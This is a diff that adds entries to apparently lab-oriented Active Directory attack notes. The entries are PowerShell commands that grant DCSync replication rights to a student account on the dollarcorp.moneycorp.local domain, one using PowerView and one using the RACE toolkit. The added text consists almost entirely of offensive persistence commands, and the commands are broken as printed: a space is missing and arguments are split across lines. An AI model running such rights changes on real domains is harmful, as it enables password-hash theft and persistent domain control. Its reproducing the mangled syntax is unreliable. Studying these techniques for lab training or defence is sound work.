@@ -545,5 +545,22 @@ Set-ADACL -SamAccountName studentuser1 -DistinguishedName 'DC=dollarcorp,DC=mone
 
 
 
+- Add rights for DCSync:
 
 
+
+```powershell
+Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentitystudent1 -Rights DCSync -PrincipalDomain
+dollarcorp.moneycorp.local -TargetDomain
+dollarcorp.moneycorp.local -Verbose
+```
+
+
+- Using ActiveDirectory Module and RACE:
+
+
+```powershell
+Set-ADACL -SamAccountName studentuser1 -DistinguishedName
+'DC=dollarcorp,DC=moneycorp,DC=local' -GUIDRight DCSync -
+Verbose
+```
